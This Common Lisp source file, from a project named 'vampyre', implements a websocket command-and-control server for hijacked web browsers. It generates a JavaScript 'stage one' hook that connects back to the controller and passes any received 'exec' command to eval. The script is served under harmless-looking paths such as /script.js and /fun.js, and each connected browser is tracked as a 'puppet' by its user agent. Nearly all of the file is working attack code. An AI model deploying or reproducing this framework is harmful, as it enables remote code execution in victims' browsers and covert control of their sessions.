(in-package :vampyre)

;; TODO:
;; Add SSL Support
;; Establish communication websocket.
;; Add port configuration.


;;; HOOKS
;;; =====


(defun basic-websocket-puppet (uri)
  (parenscript:ps
    (defvar *socket* (new (-Web-Socket (ps:lisp uri))))
    (defvar *keep-alive-interval* 10000)

    ;; Defines the function to call as soon as the websocket is open.
    (defun on-open (event)
      (setf obj (create type "my-type"))
      (chain *socket* (send (chain -J-S-O-N (stringify obj))))

      ;; Setup the Pings.
      (chain window (set-interval send-ping *keep-alive-interval*))
      ())

    ;; Test on-message function.
    (defun on-message (event)
      ;; We will be parsing JSON... Let's try-catch this.
      (try
       (progn
	 
	 ;; Do the parsing
	 (setf json
	       (chain -J-S-O-N (parse (chain event data))))
	 ;; If the parsing succeeded, obtain the "type" attribute.
	 (setf type
	       (chain json type))
	 
	 ;; Checks that type exists
	 (if (not (= (typeof type) "undefined"))

	     ;; If type is exec, meaning that we want to execute a command.
	     (if (= type "exec")
		 (progn (chain console (log "can execute!"))

			;; Try to retrieve the "command" attribute.
			(setf command (chain json command))

			;; If it exists...
			(if (not (= (typeof command) "undefined"))
			    (progn
			      (chain console (log (+ "Executing: " command)))

			      ;; Execute!
			      (eval command))
			    ;; Command does not exist.
			    (chain console (log "No command defined!"))))
		 ;; Logs the "type" attribute, since it seems unknown.
		 (chain console (log type)))
	     ;; Logs that there is no type.
	     (chain console (log "No 'type' in this JSON object."))))
      ;; If an error was thrown, log it.
       (:catch (e) (chain console (log "invalid JSON.")))
      
      ;; Logs the event that was received, just in case.
      (chain console (log event))))

    ;; Function to send a keep-alive message.
    (defun send-ping ()
      (setf obj (create type "ping"))
      (chain *socket* (send (chain -j-s-o-n (stringify obj)))))

    ;; Binds the listener to the on-open function.
    (setf (getprop *socket* 'onopen) on-open)
    (setf (getprop *socket* 'onmessage) on-message)))

(defparameter *websocket-connect-back* "ws://localhost:4445/master")

(defun get-puppet (puppet-name)
  (let ((client-list (hunchensocket:clients
		     (get-master nil))))
    (find-if (lambda (elem) (string= (name elem) puppet-name))
	     client-list)))

(defun message (puppet message)
  (hunchensocket:send-text-message puppet message))

(defun send-stage-one ()
  (setf (hunchentoot:content-type*) "text/javascript")
  (format nil (basic-websocket-puppet *websocket-connect-back*)))


;; Websocket C2 Server
;; ===================

(defun random-name (len)
  (let ((char-list (string "ABCDEFGHIJKLMNOPQRSTUVWXYZ")))
    (coerce
     (loop for i upto (- len 1) collect
	  (char char-list (random (length char-list))))
     'string)))

(defclass master (hunchensocket:websocket-resource)
  ((name :initarg :name
	 :initform (error "Name this master node!")
	 :reader name)
   (puppet-list :initarg :puppet-list
		:initform (make-hash-table)
		:reader puppet-list))
  (:default-initargs :client-class 'puppet))

(defclass puppet (hunchensocket:websocket-client)
  ;; Name of the puppet. Used for lookups and all. 
  ((name :initarg :name
	 :initform (random-name 10)
	 :accessor name)
   ;; User Agent reported by the puppet.
   (useragent :initarg :user-agent
              :initform (error "User agent required for this puppet.")
	      :accessor useragent)))

(defun get-master (request)
  (declare (ignore request))
  *puppet-master*)


(defmethod hunchensocket:client-connected ((master master) new-puppet)
  (echo :join (format nil "Puppet ~a (~a) has joined the ~a master." (name new-puppet) (useragent new-puppet) (name master))))

(defmethod hunchensocket:client-disconnected ((master master) puppet)
  (echo :leave (format nil "Puppet ~a (~a) has disconnected from ~a." (name puppet) (name puppet) (name master)))
  ())

(defun handle-message (message) (declare (ignore message)))

(defmethod hunchensocket:text-message-received ((master master) puppet message)
  ;;(hunchensocket:send-text-message puppet (format nil message))
  (v:log :debug :message (format nil "New message from ~a: ~a~%" (name puppet) message))
  ;;(handle-message message)
  )



;; Start and Stop the main Hunchentoot Server
;; ==========================================


(defparameter *websocket-port* 4445)
(defparameter *master-port* 4000)

(defparameter *puppet-master-server* nil)
(defparameter *master-server* nil)

(defparameter *websocket-uri* "/master")
(defvar *puppet-master* (make-instance 'master :name *websocket-uri*))


;; TODO: Add a parameter to configure the port from default.
(defun start-puppet-master-server ()
  (stop-puppet-master-server)
  (format t "Starting Puppet Master server on port ~a...~%" *websocket-port*)
  (hunchentoot:start (setf *puppet-master-server*
			   (make-instance 'hunchensocket:websocket-acceptor
					  :port *websocket-port*))))

(defun stop-puppet-master-server ()
  (when *puppet-master-server*
    (hunchentoot:stop *puppet-master-server*)
    (format t "Stopped Puppet Master Socket.~%")
    (setf *puppet-master-server* nil)))


(defun start-master-server ()
  (stop-master-server)
  (format t "Starting Master server on port ~a...~%" *master-port*)
  (hunchentoot:start (setf *master-server*
			   (make-instance 'super-acceptor
					  :port *master-port*))))

(defun stop-master-server ()
  (when *master-server*
    (hunchentoot:stop *master-server*)
    (format t "Stopped Master Socket.~%")
    (setf *master-server* nil)))

(defmacro echo (type message)
  `(v:log :info ,type ,message))

;;; Initialization
;;; ==============

(defun initialize ()
  (start-delivery-server)
  (start-puppet-master-server)
  (define-test-url "/test.php" 'send-test-page *delivery-server*)
  (define-script-delivery-urls '("/script.js" "/deliver.js" "/fun.js")
      'send-stage-one *delivery-server*)
  (pushnew 'get-master hunchensocket:*websocket-dispatch-table*)
  nil)

(defun initialize-master ()
  (start-master-server)
  (pushnew 'get-master hunchensocket:*websocket-dispatch-table*)
  (define-test-url "/test.php" 'send-test-page *master-server*)
  (define-script-delivery-urls '("/script.js" "/deliver.js" "/fun.js")
      'send-stage-one *master-server*)
  nil)
